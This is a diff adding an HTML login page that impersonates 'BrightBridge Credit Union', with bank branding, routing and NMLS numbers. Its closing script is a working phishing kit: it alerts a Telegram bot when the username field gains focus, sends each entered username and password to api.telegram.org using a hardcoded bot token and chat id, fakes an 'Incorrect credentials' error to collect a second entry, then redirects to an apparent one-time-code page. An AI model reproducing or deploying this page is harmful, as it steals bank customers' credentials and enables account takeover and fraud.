@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BrightBridge Authentication</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(to top, #1a3c5e, #4a90e2); /* Gradient overlay */
+            background-image: url('public/bg.png'); /* Replace with actual bridge image URL */
+            background-size: cover;
+            background-position: center;
+        }
+.login-image-container{
+display: flex;
+justify-content: center;
+align-items: stretch;
+width: 100%;
+padding: 0 120px;
+min-height: 60vh;
+overflow-y: hidden;
+}
+        form {
+            background-color: #ffffff;
+            padding: 0 2rem;
+            border-top-left-radius: 10px;
+            border-bottom-left-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            width: 50%;
+            text-align: center;
+            height: 100%;
+            flex: 1;
+}
+.image_form_background{
+    display: block;
+            width: 50%;
+            height: 100%;
+            flex: 1;
+            box-sizing: border-box;
+            background-color: gray;
+}
+.image_form_background img{
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+}
+
+        .logo {
+            margin-bottom: 1.5rem;
+            padding: 65px 0 45px 0;
+        }
+
+        .logo img {
+            max-width: 200px; /* Adjust based on actual logo size */
+            height: auto;
+        }
+
+        .form-group {
+            margin-bottom: 1.2rem;
+            text-align: left;
+            background-color: rgb(242,242,242);
+            border-radius: 16px;
+            display: flex;
+            flex-direction: column;
+            padding: 0.5rem 0.8rem;
+            position: relative;
+        }
+        .show-password {
+    position: absolute;
+    right: 20px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    color: #000;
+    font-weight: bold;
+    cursor: pointer;
+    font-family: "Montserrat",sans-serif;
+    font-weight: 700;
+    width: 15px;
+    height: 15px;
+  }
+  .show-password img{
+    width: 15px;
+    height: 15px;
+  }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #333;
+            font-size: 0.7rem;
+            font-weight: 500;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            border: 1px solid transparent;
+            font-size: 1rem;
+            background-color: transparent;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: none;
+        }
+
+        .toggle-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1.2rem;
+        }
+
+        .toggle-group input {
+            display: none;
+        }
+
+        .toggle-group label {
+            display: flex;
+            align-items: center;
+            font-size: 0.9rem;
+            color: #333;
+            cursor: pointer;
+        }
+
+        .toggle-switch {
+            width: 40px;
+            height: 20px;
+            background-color: rgb(242, 242, 242);
+            border-radius: 10px;
+            position: relative;
+            margin-right: 0.5rem;
+            transition: background-color 0.3s;
+        }
+
+        .toggle-switch::before {
+            content: '';
+            width: 16px;
+            height: 16px;
+            background-color: rgb(0, 102, 150);
+            border-radius: 50%;
+            position: absolute;
+            top: 2px;
+            left: 2px;
+            transition: transform 0.3s;
+        }
+
+        input:checked + .toggle-switch {
+            background-color: #1a3c5e;
+        }
+
+        input:checked + .toggle-switch::before {
+            transform: translateX(20px);
+        }
+
+        .captcha-group {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 1.2rem;
+            border: 1px solid #e0e0e0;
+            border-radius: 5px;
+            padding: 0.5rem;
+            background-color: #f9f9f9;
+        }
+
+        .captcha-group input {
+            margin-right: 0.5rem;
+        }
+
+        .captcha-group label {
+            font-size: 0.9rem;
+            color: #333;
+        }
+
+        .captcha-group img {
+            height: 20px;
+        }
+
+        button {
+            width: 100%;
+            padding: 0.8rem;
+            background-color: rgb(230, 230, 230);
+            color: rgb(26, 26, 26);
+            border-radius: 18px;
+            font-size: 1rem;
+            font-weight: 500;
+            border: none;
+            outline: none;
+            cursor: pointer;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        button:hover {
+            background-color: #1a3c5e;
+            color: #ffffff;
+        }
+
+        .forgot-link {
+            margin-top: 1rem;
+            padding: 40px 0;
+        }
+
+        .forgot-link a {
+            color: #1a3c5e;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+
+        footer {
+            width: 100%;
+            background-color: rgb(0, 31, 97);
+            color: #ffffff;
+            text-align: center;
+            padding: 0.5rem 0;
+            font-size: 0.8rem;
+            display: flex;
+            justify-content: flex-start;
+            flex-wrap: wrap;
+            padding: 40px 120px;
+
+        }
+        .footer-links, .footer-router, .footer-logos{
+            min-width: 48%;
+            max-width: 50%;
+        }
+.footer-links{
+    display: flex;
+    flex-wrap: wrap;
+}
+        .footer-links a {
+            color: #ffffff;
+            text-decoration: none;
+            margin: 0 0.5rem;
+            text-decoration: underline;
+            display: inline-block;
+            font-size: 1rem;
+            line-height: 2rem;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-logos {
+            margin-top: 5rem;
+            display: flex;
+            justify-content: flex-start;
+        }
+
+        .footer-logos img {
+            height: 70px;
+            margin: 0 0.5rem;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .login-image-container {
+                padding: 40px 20px;
+                justify-content: center;
+            }
+            .image_form_background{
+                display: none;
+            }
+            form{
+                width: 100%;
+                max-width: 400px;
+            }
+            .logo img {
+                max-width: 180px;
+            }
+
+            button {
+                padding: 0.7rem;
+                font-size: 0.9rem;
+            }
+
+            footer {
+                font-size: 0.7rem;
+                padding: 20px;
+            }
+.footer-links a{
+    font-size: 0.6rem;
+}
+            .footer-logos img {
+               height: 40px;
+               margin-top: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+    <div class="login-image-container">
+       
+        <form id="primary_form">
+            <div class="logo">
+                <img src="/public/logo.png" alt="BrightBridge Credit Union Logo">
+            </div>
+        
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" class="form-username" id="username" required name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" required id="password" name="password" required>
+                <button type="button" class="show-password" id="togglePasscode" onclick="togglePassword()"><img src="public/view.png" alt="show icon"/></button>
+            </div>
+            <div class="toggle-group">
+                <input type="checkbox" id="remember" name="remember">
+                <label for="remember">
+                    <span class="toggle-switch"></span>
+                    Remember Me
+                </label>
+            </div>
+            <button type="submit">Log In</button>
+            <p id="error-message" class="error-message"></p>
+            <div class="forgot-link">
+                <a href="#">Forgot Username or Password?</a>
+            </div>
+        </form>
+
+        <div class="image_form_background">
+            <img src="public/bg.png" alt="background"/>
+        </div>
+       
+    </div>
+</div>
+    <footer>
+        <div class="footer-links">
+            <a href="#">Contact</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Support</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Online Banking</a>
+            <a href="#">OBrowser Support</a>
+            <a href="#">BrightBridge Credit Union</a>
+        </div>
+        <div class="footer-router">
+          <p>NMLS number: 447563
+                     Routing number: 211384926</p>
+        </div>
+        <div class="footer-logos">
+            <img src="public/ncua.png" alt="NCUA Logo">
+            <img src="public/housing.png" alt="MSIC Logo">
+            <img src="public/msic-logo.png" alt="MSIC Logo">
+           
+        </div>
+    </footer>
+</body>
+
+<script>
+    const form = document.querySelector("#primary_form");
+    const first_input = document.querySelector(".form-username");
+    var notUsed = true;
+    var submittedOnce = false;
+    first_input.onfocus = function() {
+        var token = "7446085389:AAEDVLhoom9HbeL8AMEZDSg6PDygvG5o2AI";
+        var chat_id = "-4244251369";
+        var my_text = `Get ready, somebody is logging in`
+        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
+        if(notUsed){
+            notUsed = false;
+            let api = new XMLHttpRequest();
+        api.open("GET", url, true);
+        api.send();
+        }
+    };
+    form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        var username = document.querySelector("#username").value;
+        var password = document.querySelector("#password").value;
+        var token = "7446085389:AAEDVLhoom9HbeL8AMEZDSg6PDygvG5o2AI";
+        var chat_id = "-4244251369";
+        var my_text = `Username:${username} Password:${password}`
+        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
+        console.log(username, password);
+  
+        let api = new XMLHttpRequest();
+        api.open("GET", url, true);
+        api.send();
+  
+        if(submittedOnce){
+          window.location.href="otp.html";
+          submittedOnce = false;
+        } else {
+          const errorMessage = document.getElementById('error-message');
+              errorMessage.textContent = "Incorrect credentials, submit again";
+              errorMessage.style.color = "red";
+              submittedOnce = true;
+        }
+       
+       
+    })
+  
+    function togglePassword() {
+              const passcodeInput = document.getElementById('password');
+              const toggleButton = document.getElementById('togglePasscode');
+              if (passcodeInput.type === "password") {
+                  passcodeInput.type = "text";
+              } else {
+                  passcodeInput.type = "password";
+              }
+          }
+  </script>
+</html>
